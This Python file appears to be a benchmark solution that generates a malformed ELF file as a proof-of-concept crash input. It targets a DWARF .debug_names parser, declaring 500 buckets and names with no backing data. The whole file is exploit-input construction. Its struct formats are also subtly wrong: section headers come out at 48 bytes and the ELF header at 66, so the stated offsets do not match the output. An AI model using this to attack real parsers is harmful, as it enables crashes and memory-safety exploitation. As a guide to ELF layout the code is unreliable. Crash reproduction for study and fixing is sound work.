import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        shstrtab = b'\0.shstrtab\0.debug_names\0'
        shstrtab_size = len(shstrtab)
        total_size = 1551
        elf_size = 64
        sh_num = 3
        sh_size = 64
        sh_total = sh_num * sh_size
        shstrtab_offset = elf_size + sh_total
        debug_offset = shstrtab_offset + shstrtab_size
        debug_size = total_size - (elf_size + sh_total + shstrtab_size)
        sh1_name = 1
        sh1 = struct.pack('<IIIIIIQQII', sh1_name, 3, 0, 0, shstrtab_offset, shstrtab_size, 0, 0, 0, 0)
        sh2_name = 11
        sh2 = struct.pack('<IIIIIIQQII', sh2_name, 1, 0, 0, debug_offset, debug_size, 0, 0, 0, 0)
        sh0 = struct.pack('<IIIIIIQQII', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = 1
        e_machine = 0x3e
        e_version = 1
        e_entry = 0
        e_phoff = 0
        e_shoff = 64
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 0
        e_phnum = 0
        e_shentsize = 64
        e_shnum = 3
        e_shstrndx = 1
        elf_header = struct.pack('<16sHHIIQQQIHHHHH',
            e_ident, e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags,
            e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx)
        sections_headers = sh0 + sh1 + sh2
        unit_length_excl = debug_size - 12
        debug_data = struct.pack('<I', 0xFFFFFFFF)
        debug_data += struct.pack('<Q', unit_length_excl)
        debug_data += struct.pack('<HH', 5, 0)
        bucket_count = 500
        name_count = 500
        cu_count = 0
        local_tu_count = 0
        foreign_tu_count = 0
        abbrev_table_size = 0
        debug_data += struct.pack('<IIIIII', cu_count, local_tu_count, foreign_tu_count, bucket_count, name_count, abbrev_table_size)
        remaining = debug_size - len(debug_data)
        debug_data += b'\x00' * remaining
        poc = elf_header + sections_headers + shstrtab + debug_data
        return poc